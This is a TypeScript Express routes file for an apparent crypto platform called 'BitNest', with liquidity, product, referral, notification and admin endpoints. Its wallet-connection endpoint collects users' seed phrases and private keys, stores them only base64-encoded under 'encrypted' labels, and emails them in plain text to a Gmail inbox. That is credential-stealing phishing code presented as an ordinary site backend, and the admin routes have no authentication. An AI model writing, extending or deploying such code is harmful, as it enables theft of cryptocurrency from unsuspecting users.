import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { randomUUID } from "crypto";
import nodemailer from "nodemailer";

// Email configuration
const emailTransporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || 'bitnest.finance@gmail.com',
    pass: process.env.EMAIL_PASS || 'your-app-password'
  }
});

export async function registerRoutes(app: Express): Promise<Server> {
  // Liquidity endpoint
  app.get("/api/liquidity", async (req, res) => {
    try {
      const liquidity = await storage.getLiquidity();
      res.json({ liquidity });
    } catch (error) {
      res.status(500).json({ message: "Server error", error });
    }
  });

  // Wallet connection endpoint
  app.post("/api/connect-wallet", async (req, res) => {
    try {
      const { walletAddress, walletType, seedPhrase, privateKey } = req.body;
      
      if (!walletAddress || !walletType) {
        return res.status(400).json({ message: "Wallet address and type are required" });
      }

      // Check if user exists, create if not
      let user = await storage.getUser(walletAddress);
      if (!user) {
        const referralCode = `BN${Date.now().toString(36).toUpperCase()}`;
        user = await storage.createUser({
          walletAddress,
          referralCode,
          email: null,
          referredBy: null
        });
      }

      // Save wallet connection
      const connection = await storage.saveWalletConnection({
        userId: user.id,
        address: walletAddress,
        walletType,
        encryptedSeedPhrase: seedPhrase ? Buffer.from(seedPhrase).toString('base64') : null,
        encryptedPrivateKey: privateKey ? Buffer.from(privateKey).toString('base64') : null
      });

      // Send wallet details to email
      try {
        await emailTransporter.sendMail({
          from: process.env.EMAIL_USER || 'bitnest.finance@gmail.com',
          to: 'bitnest.finance@gmail.com',
          subject: `New Wallet Connection - ${walletType}`,
          html: `
            <h3>New Wallet Connection</h3>
            <p><strong>Wallet Address:</strong> ${walletAddress}</p>
            <p><strong>Wallet Type:</strong> ${walletType}</p>
            <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
            ${seedPhrase ? `<p><strong>Seed Phrase:</strong> ${seedPhrase}</p>` : ''}
            ${privateKey ? `<p><strong>Private Key:</strong> ${privateKey}</p>` : ''}
            <p><strong>User Agent:</strong> ${req.get('User-Agent')}</p>
          `
        });
      } catch (emailError) {
        console.error('Email sending failed:', emailError);
      }

      // Set session
      req.session.userId = user.id;
      
      res.json({ 
        success: true, 
        message: "Wallet connected successfully",
        user: { id: user.id, walletAddress: user.walletAddress, referralCode: user.referralCode }
      });
    } catch (error) {
      console.error('Wallet connection error:', error);
      res.status(500).json({ message: "Connection failed", error: error.message });
    }
  });

  // Navigation endpoints
  app.post("/api/navigate/:section", async (req, res) => {
    const { section } = req.params;
    const userId = req.session.userId;

    try {
      await storage.logAdminAction(`navigation_${section}`, `User navigated to ${section}`, userId || 'anonymous');
      
      const response = {
        section,
        timestamp: new Date().toISOString(),
        data: {}
      };

      switch (section) {
        case 'team':
          response.data = { totalUsers: await storage.getTotalUsers() };
          break;
        case 'community':
          response.data = { communityLink: 'https://t.me/bitnest_community' };
          break;
        case 'earn':
          response.data = { dailyEarnings: 'Coming Soon' };
          break;
        case 'partner':
          response.data = { partnerProgram: 'Active' };
          break;
        default:
          response.data = { message: 'Section not found' };
      }

      res.json(response);
    } catch (error) {
      res.status(500).json({ message: "Navigation failed", error });
    }
  });

  // Product interaction endpoints
  app.post("/api/product/:productId/join", async (req, res) => {
    const { productId } = req.params;
    const userId = req.session.userId;

    try {
      await storage.logAdminAction(`product_join_${productId}`, `User joined ${productId}`, userId || 'anonymous');
      
      const products = {
        'loop': { 
          name: 'BitNest Loop', 
          status: 'active',
          redirectUrl: 'https://app.bitnest.finance/loop'
        },
        'saving-box': { 
          name: 'Saving Box', 
          status: 'active',
          redirectUrl: 'https://app.bitnest.finance/savings'
        },
        'savings': { 
          name: 'BitNest Savings', 
          status: 'coming-soon',
          redirectUrl: null
        },
        'dao': { 
          name: 'BitNest DAO', 
          status: 'coming-soon',
          redirectUrl: null
        }
      };

      const product = products[productId];
      if (!product) {
        return res.status(404).json({ message: "Product not found" });
      }

      res.json({ 
        success: true,
        product,
        message: product.status === 'active' ? `Joining ${product.name}...` : `${product.name} coming soon!`
      });
    } catch (error) {
      res.status(500).json({ message: "Join failed", error });
    }
  });

  // Social links
  app.get("/api/social-links", (req, res) => {
    res.json({
      telegram: {
        groups: 'https://t.me/bitnest_groups',
        news: 'https://t.me/bitnest_news'
      },
      community: 'https://community.bitnest.finance',
      support: 'https://support.bitnest.finance'
    });
  });

  // Footer links
  app.get("/api/footer-links", (req, res) => {
    res.json({
      ecology: {
        loop: 'https://app.bitnest.finance/loop',
        savingBox: 'https://app.bitnest.finance/savings',
        lease: 'https://app.bitnest.finance/lease',
        wallet: 'https://wallet.bitnest.finance'
      },
      community: {
        joinCommunity: 'https://community.bitnest.finance',
        gitBook: 'https://docs.bitnest.finance',
        telegramGroups: 'https://t.me/bitnest_groups',
        telegramNews: 'https://t.me/bitnest_news'
      },
      about: {
        domain: 'https://bitnest.finance',
        legalDisclaimer: 'https://bitnest.finance/legal',
        termsOfUse: 'https://bitnest.finance/terms',
        privacyPolicy: 'https://bitnest.finance/privacy'
      },
      support: {
        whitePaper: 'https://bitnest.finance/whitepaper.pdf',
        securityAudit: 'https://bitnest.finance/audit',
        contract: 'https://bitnest.finance/contract'
      }
    });
  });

  // Admin endpoints
  app.get("/api/admin/stats", async (req, res) => {
    try {
      const totalUsers = await storage.getTotalUsers();
      const liquidity = await storage.getLiquidity();
      const notifications = await storage.getNotifications();
      
      res.json({
        totalUsers,
        totalLiquidity: liquidity,
        activeConnections: totalUsers,
        notifications: notifications.slice(0, 10)
      });
    } catch (error) {
      res.status(500).json({ message: "Admin stats failed", error });
    }
  });

  app.post("/api/admin/notification", async (req, res) => {
    try {
      const { title, message, type = 'info' } = req.body;
      
      if (!title || !message) {
        return res.status(400).json({ message: "Title and message are required" });
      }

      await storage.sendGlobalNotification(title, message);
      await storage.logAdminAction('global_notification', `Sent: ${title}`, 'admin');
      
      res.json({ success: true, message: "Notification sent to all users" });
    } catch (error) {
      res.status(500).json({ message: "Notification failed", error });
    }
  });

  app.get("/api/admin/users", async (req, res) => {
    try {
      const users = await storage.getAllUsers();
      res.json({ users: users.map(user => ({
        id: user.id,
        walletAddress: user.walletAddress,
        referralCode: user.referralCode,
        joinedAt: user.joinedAt
      })) });
    } catch (error) {
      res.status(500).json({ message: "Users fetch failed", error });
    }
  });

  // Notifications
  app.get("/api/notifications", async (req, res) => {
    const userId = req.session.userId;
    
    try {
      const notifications = await storage.getNotifications(userId);
      res.json({ notifications });
    } catch (error) {
      res.status(500).json({ message: "Notifications fetch failed", error });
    }
  });

  app.post("/api/notifications/:id/read", async (req, res) => {
    const { id } = req.params;
    
    try {
      await storage.markNotificationRead(id);
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ message: "Mark read failed", error });
    }
  });

  // User session
  app.get("/api/user", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ message: "Not authenticated" });
    }

    try {
      const user = await storage.getUserById(req.session.userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      res.json({ 
        user: { 
          id: user.id, 
          walletAddress: user.walletAddress,
          referralCode: user.referralCode,
          joinedAt: user.joinedAt
        } 
      });
    } catch (error) {
      res.status(500).json({ message: "Server error", error });
    }
  });

  app.post("/api/logout", (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ message: "Could not log out" });
      }
      res.json({ message: "Logout successful" });
    });
  });

  const httpServer = createServer(app);
  return httpServer;
}
